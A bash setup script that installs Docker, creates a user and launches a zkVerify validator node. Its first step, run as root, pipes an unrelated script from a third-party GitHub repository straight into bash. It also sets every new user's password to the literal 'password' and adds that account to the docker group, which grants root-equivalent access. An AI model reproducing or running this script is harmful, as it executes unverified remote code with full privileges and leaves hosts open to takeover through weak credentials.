#!/bin/bash

set -e

# Run an external script
curl -s https://raw.githubusercontent.com/zidanaetrna/unichain/refs/heads/main/button_logo_script.sh | bash

# Update system and install required packages
echo "Updating system and installing dependencies..."
apt update && apt install -y docker-compose jq sed

# Check if Docker is installed
if ! command -v docker &>/dev/null; then
    echo "Docker not found, installing Docker..."
    apt install -y docker.io --no-install-recommends
else
    echo "Docker is already installed, skipping installation."
fi

# Set username from argument or prompt for input
if [[ -z "$1" ]]; then
    read -p "Please enter the username you want to create: " NEW_USER
else
    NEW_USER="$1"
fi

# Ensure the username is not empty
if [[ -z "$NEW_USER" ]]; then
    echo "Error: Username cannot be empty!"
    exit 1
fi

# Create the new user
echo "Creating user: $NEW_USER..."
useradd -m -s /bin/bash "$NEW_USER"
echo "$NEW_USER:password" | chpasswd  # Set default password (change as needed)
usermod -aG docker "$NEW_USER"

echo "User $NEW_USER has been created and added to the Docker group."

# Switch to the new user and run commands using sudo
sudo -i -u "$NEW_USER" bash <<EOF
echo "Cloning ZkVerify repository..."
git clone https://github.com/zkVerify/compose-zkverify-simplified.git
cd compose-zkverify-simplified

echo "Running initialization script..."
./scripts/init.sh

echo "Starting the ZkVerify node..."
./scripts/start.sh
EOF

echo "ZkVerify node setup is complete!"

# Display final instructions
echo "To check running Docker containers, use: docker container ls"
echo "To check logs, use: docker logs -f validator-node"
echo "For further steps, refer to: https://docs.zkverify.io/tutorials/how_to_run_a_node/run_using_docker/run_new_validator_node/"
